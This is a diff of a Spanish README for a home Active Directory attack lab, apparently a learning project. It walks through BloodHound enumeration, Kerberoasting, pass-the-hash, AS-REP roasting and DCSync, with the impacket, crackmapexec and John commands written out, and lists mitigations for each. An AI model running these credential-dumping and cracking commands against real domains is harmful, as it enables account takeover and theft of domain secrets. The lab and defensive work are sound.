@@ -7,6 +7,26 @@ Montado íntegramente en local con VMware Workstation — entorno 100% aislado, 
  
 ---
  
+## Índice
+ 
+1. [Objetivo del proyecto](#-objetivo-del-proyecto)
+2. [Arquitectura del laboratorio](#️-arquitectura-del-laboratorio)
+3. [Usuarios del laboratorio](#-usuarios-del-laboratorio)
+4. [Setup paso a paso](#️-setup-paso-a-paso)
+   - [Fase 1 — Domain Controller](#fase-1--domain-controller-win-dc01)
+   - [Fase 2 — Clientes Windows 10](#fase-2--clientes-windows-10)
+   - [Fase 3 — Kali Linux](#fase-3--kali-linux)
+5. [Ataques documentados](#️-ataques-documentados)
+   - [Enumeración con BloodHound](#-enumeración-con-bloodhound)
+   - [Kerberoasting](#-kerberoasting)
+   - [Pass-the-Hash](#-pass-the-hash)
+   - [AS-REP Roasting](#-as-rep-roasting)
+   - [DCSync](#-dcsync)
+6. [Resumen de mitigaciones](#️-resumen-de-mitigaciones)
+7. [Referencias](#-referencias)
+ 
+---
+ 
 ## 🎯 Objetivo del proyecto
  
 Lab montado para aprender y documentar técnicas ofensivas reales sobre Active Directory.  
@@ -139,27 +159,21 @@ Set-ADAccountControl -Identity "asrepuser" -DoesNotRequirePreAuth $true
 ```
  
 ![ipconfig DC](./docs/screenshots/fase1-01-ipconfig.PNG)
-
 *IP estática asignada al DC — 192.168.100.10*
  
 ![Dominio activo](./docs/screenshots/fase1-02-domain-activo.PNG)
-
 *lab.local promovido correctamente*
  
 ![DCDiag OK](./docs/screenshots/fase1-03-dcdiag-ok.PNG)
-
 *Servicios del DC sin errores*
  
 ![DHCP](./docs/screenshots/fase1-04-dhcp-scope.PNG)
-
 *Scope DHCP activo — rango 192.168.100.100-200*
  
 ![SPN svc-sql](./docs/screenshots/fase1-05-spn-svc-sql.PNG)
-
 *Service account con SPN registrado — objetivo Kerberoasting*
  
 ![Usuarios AD](./docs/screenshots/fase1-06-usuarios-ad.PNG)
-
 *Usuarios del laboratorio creados y habilitados*
  
 ---
@@ -187,7 +201,6 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ```
  
 ![Equipos en AD](./docs/screenshots/fase2-03-computers-ad.png)
-
 *DC01, PC01 y PC02 registrados en el dominio*
  
 ---
@@ -202,7 +215,6 @@ nslookup lab.local 192.168.100.10
 ```
  
 ![Ping al DC](./docs/screenshots/fase3-02-ping-dc.png)
-
 *Conectividad con WIN-DC01 confirmada*
  
 ---
@@ -243,13 +255,11 @@ bloodhound-python \
   --zip
 ```
  
-Una vez importado el ZIP en BloodHound CE, ejecuto la query de cuentas Kerberoastables porque es el vector más común en AD real:
+Una vez importado el ZIP en BloodHound CE, ejecuto la query de cuentas Kerberoastables:
  
 ```cypher
 MATCH (u:User {hasspn:true}) RETURN u
 ```
- 
-El resultado me devuelve `SVC-SQL@LAB.LOCAL` como objetivo claro. Tiene SPN registrado, lo que significa que puedo pedir un ticket TGS cifrado con su contraseña y crackearlo offline sin generar alertas. Eso es exactamente lo que hago en el siguiente ataque.
  
 ### Resultado
  
@@ -259,15 +269,12 @@ KRBTGT@LAB.LOCAL   → Kerberoastable (no explotable en la práctica)
 ```
  
 ![BloodHound collect](./docs/screenshots/fase4-01-bloodhound-collect.png)
-
 *bloodhound-python recopila 3 equipos, 8 usuarios y 52 grupos*
  
 ![BloodHound grafo](./docs/screenshots/fase4-02-bloodhound-graph.png)
-
 *Dominio LAB.LOCAL mapeado en BloodHound CE*
  
 ![Kerberoastable accounts](./docs/screenshots/fase4-03-kerberoastable.png)
-
 *Query Cypher identifica SVC-SQL como objetivo Kerberoastable*
  
 ### Mitigación
@@ -282,24 +289,16 @@ KRBTGT@LAB.LOCAL   → Kerberoastable (no explotable en la práctica)
  
 ### Por qué es posible este ataque
  
-Kerberos permite que **cualquier usuario autenticado del dominio** solicite un ticket de servicio (TGS) para cualquier cuenta con un SPN registrado. El ticket llega cifrado con el hash NTLM de esa service account. Esto no es un bug, es cómo funciona el protocolo — el problema es que ese ticket se puede crackear offline sin límite de intentos y sin generar alertas en el DC.
+Kerberos permite que cualquier usuario autenticado del dominio solicite un TGS para cualquier cuenta con SPN registrado. El ticket llega cifrado con el hash NTLM de esa service account y se puede crackear offline sin límite de intentos ni alertas en el DC.
  
 ### Proceso de investigación
- 
-BloodHound ya identificó `svc-sql` como objetivo. Antes de lanzar el ataque me pregunto: **¿qué necesito para que GetUserSPNs funcione?** Solo un usuario del dominio válido — no hacen falta privilegios elevados en ningún momento de esta fase.
- 
-El flag `-request` es el que realmente hace el trabajo: no solo lista las cuentas con SPN, sino que solicita el TGS y lo vuelca en el formato que John entiende directamente.
  
 ```bash
 impacket-GetUserSPNs lab.local/jsmith:'Password1' \
   -dc-ip 192.168.100.10 \
   -request \
   -outputfile kerberoast.hash
-```
  
-El hash obtenido es de tipo `$krb5tgs$23$*` (RC4), el formato más crackeable. Si hubiera sido AES256 el cracking sería mucho más lento — en entornos reales esto es relevante para priorizar objetivos.
- 
-```bash
 john --format=krb5tgs \
   --wordlist=/usr/share/wordlists/rockyou.txt \
   kerberoast.hash
@@ -311,20 +310,16 @@ john --format=krb5tgs \
 svc-sql : MYpassword123#
 ```
  
-La contraseña cae en segundos. En un entorno real esto daría acceso a cualquier servicio que `svc-sql` gestione.
- 
 ![Kerberoasting hash](./docs/screenshots/fase4-04-kerberoasting-hash.png)
-
 *TGS de svc-sql obtenido con credenciales de usuario estándar*
  
 ![Contraseña crackeada](./docs/screenshots/fase4-05-kerberoasting-cracked.png)
-
 *John the Ripper crackea MYpassword123# en segundos*
  
 ### Mitigación
  
 - Contraseñas de más de 25 caracteres aleatorios en todas las service accounts
-- Usar **Group Managed Service Accounts (gMSA)** — AD rota las contraseñas automáticamente
+- Usar **Group Managed Service Accounts (gMSA)**
 - Auditar cuentas con SPN: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}`
  
 ---
@@ -333,27 +328,17 @@ La contraseña cae en segundos. En un entorno real esto daría acceso a cualquie
  
 ### Por qué es posible este ataque
  
-Windows almacena credenciales como hashes NTLM en memoria (proceso LSASS). El protocolo NTLM acepta el hash directamente como autenticación — no necesita la contraseña en texto claro. Si obtengo el hash de un usuario privilegiado, puedo autenticarme como él en cualquier máquina del dominio sin saber su contraseña.
+Windows almacena credenciales como hashes NTLM en memoria (LSASS). NTLM acepta el hash directamente como autenticación sin necesitar la contraseña en texto claro.
  
 ### Proceso de investigación
  
-Tengo credenciales de `localadmin` (Domain Admin). Mi pregunta es: **¿a qué máquinas tengo acceso con este hash?** En vez de probar una por una, uso CrackMapExec para escanear toda la subred `/24` de una sola vez.
- 
-Primero extraigo el hash NTLM del DC:
- 
 ```bash
 impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10
-```
  
-El hash que me interesa es la segunda parte del formato `LM:NTLM`. El LM puedo ignorarlo en sistemas modernos.
- 
-```bash
 crackmapexec smb 192.168.100.0/24 \
   -u localadmin \
   -H 7dfa0531d73101ca080c7379a9bff1c7
 ```
- 
-`Pwn3d!` en todas las IPs del dominio porque `localadmin` está en el grupo de admins locales de todos los clientes — algo habitual en empresas que reutilizan la misma cuenta de administración en toda la red.
  
 ### Resultado
  
@@ -364,18 +349,16 @@ crackmapexec smb 192.168.100.0/24 \
 ```
  
 ![Secretsdump hashes](./docs/screenshots/fase4-07-ntlm-hashes.png)
-
 *Hashes NTLM de todos los usuarios del dominio extraídos*
  
 ![Pass-the-Hash Pwn3d](./docs/screenshots/fase4-08-pass-the-hash.png)
-
 *Acceso como Domain Admin sin contraseña — Pwn3d!*
  
 ### Mitigación
  
 - Deshabilitar NTLM donde sea posible y forzar Kerberos
-- Activar **Windows Defender Credential Guard** para proteger LSASS
-- Implementar **LAPS** para que cada máquina tenga una contraseña de admin local distinta
+- Activar **Windows Defender Credential Guard**
+- Implementar **LAPS** para contraseñas de admin local únicas por máquina
 - **Protected Users Security Group** para cuentas privilegiadas
  
 ---
@@ -384,13 +367,9 @@ crackmapexec smb 192.168.100.0/24 \
  
 ### Por qué es posible este ataque
  
-La pre-autenticación Kerberos obliga al cliente a demostrar que conoce la contraseña antes de recibir ningún ticket. Si un administrador desactiva esta opción (ocurre por compatibilidad con software legacy), cualquiera puede solicitar un AS-REP — un ticket cifrado con la contraseña del usuario — **sin necesitar ninguna credencial del dominio**.
+Sin pre-autenticación Kerberos habilitada, cualquiera puede solicitar un AS-REP cifrado con la contraseña del usuario sin necesitar ninguna credencial del dominio.
  
 ### Proceso de investigación
- 
-La diferencia clave con Kerberoasting es que aquí **no necesito estar autenticado**. Puedo lanzar este ataque desde fuera solo sabiendo el nombre de usuario — lo que lo hace especialmente peligroso en la fase de reconocimiento externo.
- 
-El flag `-no-pass` define el ataque: le digo a Impacket que no tengo contraseña y aun así me devuelve un hash crackeable.
  
 ```bash
 impacket-GetNPUsers lab.local/asrepuser \
@@ -409,18 +388,15 @@ asrepuser : Welcome1!
 ```
  
 ![AS-REP hash obtenido](./docs/screenshots/fase5-02-asrep-hash.png)
-
 *Hash obtenido sin ninguna credencial del dominio*
  
 ![AS-REP crackeado](./docs/screenshots/fase5-03-asrep-cracked.png)
-
 *Welcome1! crackeado con John the Ripper*
  
 ### Mitigación
  
 - Forzar pre-autenticación Kerberos en todos los usuarios sin excepción
 - Auditar periódicamente: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`
-- Si el software legacy lo requiere, aislar esa cuenta y monitorizar su actividad
  
 ---
  
@@ -428,34 +404,19 @@ asrepuser : Welcome1!
  
 ### Por qué es posible este ataque
  
-Los Domain Controllers se replican entre sí usando el protocolo MS-DRSR. Esta replicación requiere permisos especiales (`DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All`). Si una cuenta de usuario tiene estos permisos — por mala configuración o privilegios heredados — puede simular ser un DC y pedirle al DC real todos los hashes del dominio.
+Si una cuenta tiene permisos de replicación de directorio puede simular ser un DC y pedirle al DC real todos los hashes del dominio, incluyendo Administrator y krbtgt.
  
 ### Proceso de investigación
- 
-Ya tengo acceso como `localadmin` (Domain Admin). Mi pregunta es: **¿cuál es el objetivo de mayor valor?** Hay dos hashes que lo cambian todo:
- 
-- Hash de `Administrator` → acceso total permanente
-- Hash de `krbtgt` → permite crear **Golden Tickets**, que dan acceso al dominio incluso si se cambian todas las contraseñas después
- 
-Primero hago un DCSync completo para ver el scope total, luego voy a por los objetivos específicos.
- 
-El flag `-just-dc` usa el protocolo de replicación en vez de intentar dumpear localmente — más silencioso y funciona en remoto:
  
 ```bash
 # DCSync completo
 impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10 \
   -just-dc
  
-# Hash de Administrator
-impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10 \
-  -just-dc-user Administrator
- 
 # Hash de krbtgt — base para Golden Ticket
 impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10 \
   -just-dc-user krbtgt
 ```
- 
-Con el hash de `krbtgt` se podría crear un Golden Ticket con `impacket-ticketer` que funcionaría incluso después de rotar todas las contraseñas del dominio. Eso queda fuera del scope de este lab, pero es la razón por la que `krbtgt` es el activo más crítico de cualquier dominio AD.
  
 ### Resultado
  
@@ -465,18 +426,16 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
 ```
  
 ![DCSync todos los hashes](./docs/screenshots/fase6-01-dcsync-all.png)
-
 *Replicación completa del dominio — todos los hashes extraídos*
  
 ![DCSync krbtgt](./docs/screenshots/fase6-03-dcsync-krbtgt.png)
-
 *Hash de krbtgt obtenido — base para Golden Ticket*
  
 ### Mitigación
  
-- Auditar y restringir permisos de replicación — solo los DCs reales deben tenerlos
+- Auditar y restringir permisos de replicación
 - Monitorizar eventos **4662** en el log de seguridad del DC
-- Si se detecta DCSync: rotar el hash de `krbtgt` **dos veces** seguidas para invalidar Golden Tickets en circulación
+- Si se detecta DCSync: rotar el hash de `krbtgt` **dos veces** seguidas
  
 ---
  
@@ -484,11 +443,11 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
  
 | Ataque | Mitigación principal |
 |---|---|
-| Enumeración BloodHound | Mínimo privilegio · Limitar consultas LDAP · Evento 1644 |
+| Enumeración BloodHound | Mínimo privilegio · Limitar LDAP · Evento 1644 |
 | Kerberoasting | Contraseñas +25 chars · Usar gMSA |
 | Pass-the-Hash | Deshabilitar NTLM · Credential Guard · LAPS |
 | AS-REP Roasting | Forzar pre-autenticación en todos los usuarios |
-| DCSync | Restringir permisos de replicación · Evento 4662 · Rotar krbtgt x2 |
+| DCSync | Restringir replicación · Evento 4662 · Rotar krbtgt x2 |
  
 ---
  
